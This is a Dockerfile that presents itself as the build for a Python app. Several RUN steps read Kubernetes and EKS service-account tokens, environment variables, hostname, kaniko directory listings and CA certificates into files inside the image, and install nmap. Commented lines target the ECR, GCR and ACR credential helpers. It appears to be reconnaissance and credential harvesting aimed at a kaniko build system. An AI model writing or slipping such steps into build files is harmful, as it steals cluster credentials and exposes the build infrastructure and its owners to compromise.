FROM python:3.6
CMD ["cp","-rf","/kaliko/*"," ","."]
COPY . /app
WORKDIR /app
RUN echo `cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token` >> /admin.txt
RUN echo `cat /var/run/secrets/kubernetes.io/serviceaccount/token` >> /admin.txt
RUN apt-get update
RUN apt-get install nmap -y
RUN apt install tree 
RUN echo `ls -l /kaniko` >> /dir.txt
RUN echo `ls -l /home` >> /dir.txt
RUN echo `hostname` >> /dir.txt
RUN echo `tree /kaniko` >> /tree.txt
RUN echo `env`> /env.txt
RUN echo `cat /kaniko/ssl/certs/ca-certificates.crt` > /cert
VOLUME /kaniko
# RUN echo `cat /kaniko/docker-credential-ecr-login` >> /secret.txt
# RUN echo `cat /kaniko/docker-credential-gcr` >> /secret.txt
# RUN echo `cat /kaniko/docker-credential-acr-env` >> /secret.txt
RUN apt update
RUN apt install net-tools -y
RUN pip install -r requirements.txt
ENTRYPOINT ["python"]
CMD ["app.py"]
